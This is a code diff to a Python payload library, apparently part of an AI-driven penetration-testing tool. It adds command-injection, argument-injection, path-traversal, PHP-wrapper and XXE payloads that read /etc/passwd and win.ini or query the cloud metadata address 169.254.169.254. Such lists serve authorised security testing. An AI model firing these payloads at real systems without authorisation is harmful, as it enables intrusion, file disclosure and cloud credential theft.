@@ -8,11 +8,10 @@ import hashlib
 import json
 import random
 import urllib.parse
-from datetime import datetime
 from typing import Any, Callable, Dict, List, Optional
 
 from ai_osop.adapters.payload_mcp import PayloadMCPAdapter
-from ai_osop.core.config import VulnClass, settings
+from ai_osop.core.config import VulnClass
 from ai_osop.core.models import Payload
 
 
@@ -129,9 +128,82 @@ class PayloadTemplateLibrary:
                 "| id",
                 "$(id)",
                 "`id`",
+                "& whoami",
+                "&& id",
+                "|| id",
+                "; cat /etc/passwd",
+                "%0aid",
+                "\nid\n",
+            ],
+            "command_injection_windows": [
+                "& whoami",
+                "| whoami",
+                "&& type C:\\Windows\\win.ini",
+                "%0awhoami",
+            ],
+            "argument_injection": [
+                "-o ProxyCommand=id",
+                "--use-askpass=/bin/sh",
             ],
             "deserialization": [
                 "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhw",
+            ],
+        },
+        VulnClass.LFI: {
+            "unix_traversal": [
+                "../../../../etc/passwd",
+                "../../../../../../etc/passwd",
+                "....//....//....//etc/passwd",
+                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+                "..%252f..%252f..%252fetc%252fpasswd",
+                "/etc/passwd%00",
+            ],
+            "windows_traversal": [
+                "..\\..\\..\\..\\windows\\win.ini",
+                "..%5c..%5c..%5cwindows%5cwin.ini",
+                "C:\\Windows\\System32\\drivers\\etc\\hosts",
+            ],
+            "php_wrappers": [
+                "php://filter/convert.base64-encode/resource=index.php",
+                "php://filter/read=string.rot13/resource=index.php",
+                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
+                "expect://id",
+            ],
+            "log_poisoning": [
+                "/var/log/apache2/access.log",
+                "/proc/self/environ",
+                "/proc/self/cmdline",
+            ],
+        },
+        VulnClass.XXE: {
+            "file_read": [
+                (
+                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
+                    '"file:///etc/passwd">]><foo>&xxe;</foo>'
+                ),
+                (
+                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
+                    '"file:///c:/windows/win.ini">]><foo>&xxe;</foo>'
+                ),
+            ],
+            "php_wrapper": [
+                (
+                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
+                    '"php://filter/convert.base64-encode/resource=/etc/passwd">]>'
+                    "<foo>&xxe;</foo>"
+                ),
+            ],
+            "ssrf_via_xxe": [
+                (
+                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
+                    '"http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>'
+                ),
+            ],
+            "billion_laughs_detect": [
+                (
+                    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY a "detect">]>'
+                    "<lolz>&a;</lolz>"
+                ),
             ],
         },
     }
@@ -280,7 +352,9 @@ class AdaptivePayloadEngine:
     - WAF profile learning
     """
 
-    def __init__(self, mcp_adapter: PayloadMCPAdapter, llm_client: Optional[Any] = None):
+    def __init__(
+        self, mcp_adapter: Optional[PayloadMCPAdapter] = None, llm_client: Optional[Any] = None
+    ):
         self.mcp = mcp_adapter
         self.llm_client = llm_client
         self.template_library = PayloadTemplateLibrary()
@@ -290,6 +364,10 @@ class AdaptivePayloadEngine:
 
         self._waf_profiles: Dict[str, Dict[str, Any]] = {}
         self._population_history: Dict[str, List[Payload]] = {}
+
+    def get_payloads(self, vuln_type: VulnClass) -> List[str]:
+        """Get list of payload strings for the specified vulnerability class."""
+        return self.template_library.get_templates(vuln_type)
 
     async def generate_initial_population(
         self, vuln_type: VulnClass, context: Dict[str, Any], population_size: int = 20
